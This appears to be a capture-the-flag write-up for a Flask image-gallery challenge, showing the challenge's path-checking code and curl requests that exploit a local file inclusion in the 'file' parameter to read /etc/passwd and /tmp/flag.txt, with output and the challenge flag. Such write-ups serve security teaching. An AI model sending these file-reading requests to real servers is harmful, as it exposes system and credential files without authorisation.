<h1> Galleria </h1>

<p> On this flask web server we can upload some image file and see all the image uploads on the server. </p>

```bash
$ curl https://galleria.chal.nbctf.com/gallery                                                             
<!DOCTYPE html>
<html>
    <head>
        <title>Galleria</title>
        <style>
        </style>
    </head>
    <body>
        <div class="header">
            <h1>Welcome to the Galleria!</h1>
        </div>
        <div class="upload-form">
            <h2>Upload your images here:</h2>
            <form action="/upload" method="post" enctype="multipart/form-data">
                <input type="file" name="image" accept="image/*" />
                <button type="submit">Upload</button>
            </form>
        </div>
        <div class="gallery">

            <img src="/gallery?file=images.png" />

            <img src="/gallery?file=help.png" />

            <img src="/gallery?file=Screenshot_2022-10-28_130929.png" />

            <img src="/gallery?file=previous.png" />

            <img src="/gallery?file=crypt.js.png" />
        </div>
    </body>
</html>%
```
<p>We can see that all images are loaded through the file parameter. After looking at the source code we can see that the parameter is vulnerable to LFI.</p>

```python
def check_file_path(path):
    _path = Path(path)

    parts = [*Path.cwd().parts][1:]
    print(parts)
    for part in _path.parts:
        if part == '.':
            continue
        if part == '..':
            parts.pop()
        else:
            parts.append(part)

        if len(parts) == 0:
            return False
    print(parts)
```
<p> We can explot a basic LFI to read sensitive files and the flag ! </p>

```bash
$ curl https://galleria.chal.nbctf.com/gallery\?file\=/etc/passwd    
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```
```bash
$ curl https://galleria.chal.nbctf.com/gallery\?file\=/tmp/flag.txt
nbctf{w0nd3rh0000yyYYyYyyYyyyYyYYYyy!}
```
